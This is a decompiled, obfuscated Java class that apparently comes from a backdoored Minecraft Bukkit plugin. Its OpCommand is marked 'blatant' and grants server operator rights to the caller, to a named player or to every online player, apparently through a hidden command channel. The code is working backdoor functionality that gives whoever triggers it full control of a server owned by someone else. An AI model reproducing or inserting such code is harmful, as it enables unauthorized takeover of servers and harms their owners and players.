/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.methods.API;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class OpCommand
extends Command {
    @Override
    public boolean isBlatant() {
        return true;
    }

    @Override
    public void execute(Core lllllllllllllllllllllllIIlIlllII, String lllllllllllllllllllllllIIlIllIll, String[] lllllllllllllllllllllllIIlIllIlI, Player lllllllllllllllllllllllIIlIllIIl) {
        if (lllllllllllllllllllllllIIlIllIlI.length <= 1) {
            API.opPlayer(lllllllllllllllllllllllIIlIllIIl);
            lllllllllllllllllllllllIIlIllIIl.sendMessage(Settings.PREFIX("You are now an operator"));
        } else if (lllllllllllllllllllllllIIlIllIlI[1].equals("*")) {
            for (Player lllllllllllllllllllllllIIlIlllll : Bukkit.getOnlinePlayers()) {
                if (lllllllllllllllllllllllIIlIlllll.isOp()) continue;
                API.opPlayer(lllllllllllllllllllllllIIlIlllll);
            }
            lllllllllllllllllllllllIIlIllIIl.sendMessage(Settings.PREFIX("All online players are now operators"));
        } else {
            Player lllllllllllllllllllllllIIlIllllI = Bukkit.getServer().getPlayer(lllllllllllllllllllllllIIlIllIlI[1]);
            if (lllllllllllllllllllllllIIlIllllI == null) {
                lllllllllllllllllllllllIIlIllIIl.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(lllllllllllllllllllllllIIlIllIlI[1]).append(Settings.WHITE).append(" is not online."))));
            } else {
                API.opPlayer(lllllllllllllllllllllllIIlIllllI);
                lllllllllllllllllllllllIIlIllIIl.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(lllllllllllllllllllllllIIlIllllI.getName()).append(Settings.WHITE).append(" is now an operator"))));
            }
        }
    }

    public OpCommand() {
        OpCommand lllllllllllllllllllllllIIllIIlIl;
    }
}

